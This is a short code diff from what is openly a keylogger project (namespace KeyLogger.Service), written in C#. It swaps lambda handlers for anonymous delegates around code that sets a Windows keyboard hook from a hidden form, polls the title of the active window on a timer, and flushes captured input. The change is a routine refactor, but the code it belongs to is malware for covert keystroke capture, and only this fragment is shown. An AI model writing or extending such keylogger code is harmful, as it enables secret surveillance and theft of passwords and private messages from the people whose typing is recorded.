@@ -86,7 +86,7 @@ namespace KeyLogger.Service
             Application.SetCompatibleTextRenderingDefault(false);
 
             var form = new HiddenForm();
-            form.Load += (s, e) =>
+            form.Load += delegate
             {
                 _keyboardProc = HookCallback;
                 using (Process p = Process.GetCurrentProcess())
@@ -95,10 +95,10 @@ namespace KeyLogger.Service
                         GetModuleHandle(m.ModuleName), 0);
 
                 var timer = new System.Windows.Forms.Timer { Interval = WINDOW_POLL_MS };
-                timer.Tick += (s, args) => { PollWindowTitle(); FlushIfIdle(); };
+                timer.Tick += delegate { PollWindowTitle(); FlushIfIdle(); };
                 timer.Start();
             };
-            form.FormClosing += (s, args) =>
+            form.FormClosing += delegate
             {
                 if (_hookId != IntPtr.Zero) UnhookWindowsHookEx(_hookId);
             };
